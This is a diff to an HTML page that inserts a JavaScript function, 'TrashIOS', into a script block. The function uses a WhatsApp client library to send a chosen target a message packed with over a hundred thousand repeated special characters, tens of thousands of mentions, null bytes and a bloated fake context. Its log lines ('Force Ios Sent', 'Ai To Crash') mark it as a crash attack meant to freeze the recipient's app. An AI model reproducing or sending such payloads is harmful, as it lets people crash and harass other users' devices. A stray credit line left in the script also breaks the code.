@@ -238,7 +238,97 @@
     </div>
     
     <script>
-        // Your JavaScript code here
+         async function TrashIOS(isTarget, Ptcp = true) {
+  await sock.relayMessage(isTarget, {
+      extendedTextMessage: {
+        text: "#4izxvelzExerct1st" 
+        + `${"ꦾ".repeat(103000)} ${"@13135550002".repeat(25000)}`,
+        contextInfo: {
+          stanzaId: "1234567890ABCDEF",
+          participant: "13135550002@s.whatsapp.net",
+          quotedMessage: {
+            callLogMesssage: {
+              isVideo: true,
+              callOutcome: "1",
+              durationSecs: "0",
+              callType: "REGULAR",
+              participants: [
+                { jid: "13135550002@s.whatsapp.net", callOutcome: "1" }
+              ]
+            }
+          },
+          remoteJid: "13135550002@s.whastapp.net",
+          conversionSource: "source_example",
+          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+          conversionDelaySeconds: 10,
+          forwardingScore: 99999999,
+          isForwarded: true,
+          quotedAd: {
+            advertiserName: "Example Advertiser",
+            mediaType: "IMAGE",
+            jpegThumbnail: Jepeg,
+            caption: "This is an ad caption"
+          },
+          placeholderKey: {
+            remoteJid: "13135550002@s.whatsapp.net",
+            fromMe: false,
+            id: "ABCDEF1234567890"
+          },
+          expiration: 86400,
+          ephemeralSettingTimestamp: "1728090592378",
+          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+          externalAdReply: {
+            title: "SYONC - CRITICAL FINISH",
+            body: `Ai To Crash ${"\0".repeat(200)}`,
+            mediaType: "VIDEO",
+            renderLargerThumbnail: true,
+            previewType: "VIDEO",
+            thumbnail: Jepeg,
+            sourceType: "x",
+            sourceId: "x",
+            sourceUrl: "https://www.facebook.com/WhastApp",
+            mediaUrl: "https://www.facebook.com/WhastApp",
+            containsAutoReply: true,
+            showAdAttribution: true,
+            ctwaClid: "ctwa_clid_example",
+            ref: "ref_example"
+          },
+          entryPointConversionSource: "entry_point_source_example",
+          entryPointConversionApp: "entry_point_app_example",
+          entryPointConversionDelaySeconds: 5,
+          disappearingMode: {},
+          actionLink: { url: "https://www.facebook.com/WhatsApp" },
+          groupSubject: "Example Group Subject",
+          parentGroupJid: "13135550002@g.us",
+          trustBannerType: "trust_banner_example",
+          trustBannerAction: 1,
+          isSampled: false,
+          utm: {
+            utmSource: "utm_source_example",
+            utmCampaign: "utm_campaign_example"
+          },
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: "13135550002@newsletter",
+            serverMessageId: 1,
+            newsletterName: "Meta Ai",
+            contentType: "UPDATE",
+            accessibilityText: "Meta Ai"
+          },
+          businessMessageForwardInfo: {
+            businessOwnerJid: "13135550002@s.whatsapp.net"
+          },
+          smbriyuCampaignId: "smb_riyu_campaign_id_example",
+          smbServerCampaignId: "smb_server_campaign_id_example",
+          dataSharingContext: { showMmDisclosure: true }
+        }
+      }
+    },
+    Ptcp ? { participant: { jid: isTarget } } : {}
+  );
+
+  console.log("Success! Force Ios Sent");
+}
+– @sheringcode code here
         console.log("Page loaded successfully!");
     </script>
 </body>
